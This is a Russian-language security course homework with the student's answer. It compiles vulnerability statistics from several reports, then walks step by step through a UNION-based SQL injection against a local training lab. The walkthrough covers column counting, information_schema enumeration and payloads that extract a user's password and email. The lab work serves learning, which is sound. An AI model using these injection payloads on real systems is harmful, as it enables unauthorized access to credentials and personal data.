# Домашнее задание
Провести симуляцию атаки по одной из предложенных уязвимостей OWASP Top 10 - Web

## Цель:
Собрать статистику:
- какую долю атак на компании проводят через веб-уязвимости, а также распределение по конкретным уязвимостям.
- потренироваться на практике достать через sql-инъекцию чувствительные данные из приложения

## Описание/Пошаговая инструкция выполнения домашнего задания:

### Часть I.
Для I части дз необходимо почитать исследовательские отчеты в российских и зарубежных источниках. Источники вы должны найти сами.
Ответом будет текстовый файл, содержащий:

- ссылки на источники
- доля успешных атак на организации, проведенных с помощью эксплуатации веб-уязвимостей
- распределение по конкретным уязвимостям.
- Если по разным источникам данные рознятся, можете указать scope, для которого проводилось исследование (например, для гос организаций - такой-то процент, для IT-компаний - такой-то).

За эту часть задания дается 4 балла

### Часть II.
Подготовка
- Скачать и установить на локальную машину докер отсюда 
```https://www.docker.com/products/docker-desktop```

- В папку с проектом помещаем файл docker-compose.yml (находится в материалах к занятию)

- В терминале из папки проекта выполнить docker-compose up -d

После выполнения этой команды на localhost:8080 станет доступна страничка для выполнения дз. Обратите внимание, сначала необходимо выполнить установку базы (по ссылке на странице) и после этого уже приступать к заданию.
#### Задания.
- узнать пароль пользователя с ником Volk2 (2 балла)
- узнать почту пользователя с ником Vinni-pukh (4 балла)

Ответом будет текстовый файл, содержащий ход ваших рассуждений, а также все (! в том числе те, которые не принесли результата) запросы (url), которые вы отправите на странице с заданием, включая те, с помощью которых конфиденциальные данные отдаются сервером.

Постарайтесь не пользоваться sqlmap-ом или другими автоматическими средствами, вам необходимо понять, как устроена sql-i. Достать ответы из контйнера тоже не вариант, потому что будет проверяться ход ваших рассуждений, какие запросы вы пробовали отправлять.

Начать разбираться рекомендую отсюда https://www.hackingloops.com/sql-injection-cheat-sheet/.
И поискового запроса sql injection cheat sheet.
---

# Ответ
# Часть I.
### [2021 Software vulnerability snapshot - an analysis by Synopsys Application Security Testing Services](https://www.synopsys.com/content/dam/synopsys/sig-assets/reports/rp-2021-software-vulnerabilities-snapshot.pdf)

|Description|OWASP Top 10: 2021 Category|Percentage of Vulnerability in Total/Vulnerabilities Found|
|-|-|-|
|Information Disclosure: Information Leakage|A01:2021—Broken Access Control|19%|
|Server Misconfiguration|A05:2021—Security Misconfiguration|18%|
|Insufficient Transport Layer Protection|A02:2021—Cryptographic Failures|8%|
|Authorization: Insufficient Authorization|A07:2021—Identification and Authentication Failures|7%|
|Application Privacy Tests|A07:2021—Identification and Authentication Failures|6%|
|Client-Side Attacks: Content Spoofing|A03:2021—Injection|5%|
|Fingerprinting|A07:2021—Identification and Authentication Failures|4%|
|Authentication: Insufficient Authentication|A07:2021—Identification and Authentication Failures|4%|
|Application Misconfiguration|A05:2021—Security Misconfiguration|3%|
|Client-Side Attacks: Cross-Site Scripting|A03:2021—Injection|2%|

### [CISA 2021 CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html)

|Rank|ID|Name|Score|2020 Rank Change|
|-|-|-|-|-|
[1]|CWE-787|Out-of-bounds Write|65.93|+1|
[2]|CWE-79|Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')|46.84|-1|
[3]|CWE-125|Out-of-bounds Read|24.9|+1|
[4]|CWE-20|Improper Input Validation|20.47|-1|
[5]|CWE-78|Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')|19.55|+5|
[6]|CWE-89|Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')|19.54|0|
[7]|CWE-416|Use After Free|16.83|+1|
[8]|CWE-22|Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')|14.69|+4|
[9]|CWE-352|Cross-Site Request Forgery (CSRF)|14.46|0|
[10]|CWE-434|Unrestricted Upload of File with Dangerous Type|8.45|+5|
[11]|CWE-306|Missing Authentication for Critical Function|7.93|+13|
[12]|CWE-190|Integer Overflow or Wraparound|7.12|-1|
[13]|CWE-502|Deserialization of Untrusted Data|6.71|+8|
[14]|CWE-287|Improper Authentication|6.58|0|
[15]|CWE-476|NULL Pointer Dereference|6.54|-2|
[16]|CWE-798|Use of Hard-coded Credentials|6.27|+4|
[17]|CWE-119|Improper Restriction of Operations within the Bounds of a Memory Buffer|5.84|-12|
[18]|CWE-862|Missing Authorization|5.47|+7|
[19]|CWE-276|Incorrect Default Permissions|5.09|+22|
[20]|CWE-200|Exposure of Sensitive Information to an Unauthorized Actor|4.74|-13|
[21]|CWE-522|Insufficiently Protected Credentials|4.21|-3|
[22]|CWE-732|Incorrect Permission Assignment for Critical Resource|4.2|-6|
[23]|CWE-611|Improper Restriction of XML External Entity Reference|4.02|-4|
[24]|CWE-918|Server-Side Request Forgery (SSRF)|3.78|+3|
[25]|CWE-77|Improper Neutralization of Special Elements used in a Command ('Command Injection')|3.58|+6|

### [2021 CWE Most Important Hardware Weaknesses](https://cwe.mitre.org/scoring/lists/2021_CWE_MIHW.html)

|ID|Name|
|-|-|
|CWE-1189|Improper Isolation of Shared Resources on System-on-a-Chip (SoC)|
|CWE-1191|On-Chip Debug and Test Interface With Improper Access Control|
|CWE-1231|Improper Prevention of Lock Bit Modification|
|CWE-1233|Security-Sensitive Hardware Controls with Missing Lock Bit Protection|
|CWE-1240|Use of a Cryptographic Primitive with a Risky Implementation|
|CWE-1244|Internal Asset Exposed to Unsafe Debug Access Level or State|
|CWE-1256|Improper Restriction of Software Interfaces to Hardware Features|
|CWE-1260|Improper Handling of Overlap Between Protected Memory Ranges|
|CWE-1272|Sensitive Information Uncleared Before Debug/Power State Transition|
|CWE-1274|Improper Access Control for Volatile Memory Containing Boot Code|
|CWE-1277|Firmware Not Updateable|
|CWE-1300|Improper Protection of Physical Side Channels|

### [OWASP TOP 10+](https://www.owasptopten.org/building-the-2021-top-ten-survey)

|Rank|ID|Name|Score|
|-|-|-|-|
|1|[CWE-359]|Exposure of Private Information ('Privacy Violation')|748|
|2|[CWE-310/311/312/326/327]|Cryptographic Failures|584|
|3|[CWE-502]|Deserialization of Untrusted Data|514|
|4|[CWE-639]|Authorization Bypass Through User-Controlled Key (IDOR & Path Traversal)|493|
|5|[CWE-223/CWE-778]|Insufficient Logging and Monitoring|440|
|6|[CWE-918]|Server-Side Request Forgery (SSRF)|390|
|7|[CWE-829]|Inclusion of Functionality from Untrusted Control Sphere (3rd Party Content)|351|
|8|[CWE-611]|Improper Restriction of XML External Entity Reference ('XXE')|300|
|9|[CWE-400]|Application Denial of Service|292|
|10|[CWE-601]|Unvalidated Forward and Redirects|252|
|11|[CWE-451]|User Interface (UI) Misrepresentation of Critical Information (Clickjacking and others)|174|
|12|[CWE-799]|Improper Control of Interaction Frequency (Anti-Automation)|126|
|13|[CWE-915]|Mass Assignment|76|


---
# Часть II.

### Получение данных через SQLi:

1. Выполню установку БД с web-страницы согласно заданию
http://192.168.103.88:8080

2. Начну смотреть данные с web-страницы
http://192.168.103.88:8080/task/

##### Переберу id от 1 до 10

<br/>http://192.168.103.88:8080/task?id=1 -- (admin)
<br/>http://192.168.103.88:8080/task?id=2 -- (Volk)
<br/>http://192.168.103.88:8080/task?id=3 -- (Matroskin)
<br/>http://192.168.103.88:8080/task?id=4 -- (Vinni-pukh)
<br/>http://192.168.103.88:8080/task?id=5 -- (Neznaika)
<br/>http://192.168.103.88:8080/task?id=6 -- (kotenok)
<br/>http://192.168.103.88:8080/task?id=7 -- (Karlson)
<br/>http://192.168.103.88:8080/task?id=8 -- (Kesha)
<br/>http://192.168.103.88:8080/task?id=9 -- (Volk2)
<br/>http://192.168.103.88:8080/task?id=10 -- (пусто)

Как видно, в этой таблице всего 9 записей
<br/>

##### Проверю id 0,-1
<br/><a>http://192.168.103.88:8080/task/?id=0 -- (пусто)
<br/><a>http://192.168.103.88:8080/task?id=-1 -- (пусто)
<br/>
##### Попробую подобрать запрос (в.т.ч. количество колонок)
<a>http://192.168.103.88:8080/task?id=-1' UNION SELECT 1 -- -</a> (Неудачно) The used SELECT statements have a different number of columns
<a>http://192.168.103.88:8080/task?id=-1' UNION SELECT 1,1 -- -</a> (Неудачно) The used SELECT statements have a different number of columns
<a>http://192.168.103.88:8080/task?id=-1' UNION SELECT 1,1,1 -- -</a> (Удачно)
Каждый запрос должен возвращать именно 3 колонки
<br/>

##### Получу список таблиц текущей БД
<a>http://192.168.103.88:8080/task?id=-1' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ';'),database(),null FROM information_schema.TABLES WHERE table_schema=database()-- -</a>

|Database|Tables|
|-|-|
|security|emails<br/>users|
<br/>

##### Получу имена колонок таблиц
<a>http://192.168.103.88:8080/task?id=-1' UNION SELECT GROUP_CONCAT(column_name SEPARATOR ';'),null,null FROM information_schema.COLUMNS WHERE table_schema=database() AND TABLE_NAME = 'users'-- -</a>

|Table|Columns|
|-|-|
|users|id<br/>username<br/>password|
<br/>

<a>http://192.168.103.88:8080/task?id=-1' UNION SELECT null,GROUP_CONCAT(column_name SEPARATOR ';'),null FROM information_schema.COLUMNS WHERE table_schema=database() AND TABLE_NAME = 'emails'-- -</a>

|Table|Columns|
|-|-|
|emails|id<br/>email_id|
<br/>

##### Получу данные пользователя с id=9 из таблицы users
<a>http://192.168.103.88:8080/task?id=-1' UNION SELECT username,password,null FROM users WHERE id=9-- -</a>

|Login|Password|
|-|-|
|Volk2|Wa spoiuuuuu|
<br/>

##### Получу данные email пользователя с ником Vinni-pukh
<a>http://192.168.103.88:8080/task?id=-1' UNION SELECT GROUP_CONCAT(id,"-",email_id),null,null FROM emails WHERE id=4-- -</a>

Из ранее полученных данных я знаю что у пользователя Vinni-pukh, id=4. Буду ориентироваться на эти данные
Получаю результат:
  |id (table users)|username|email|
  |-|-|-|
  |4|Vinni-pukh|honey_lover@otus-lab.com|
<br/>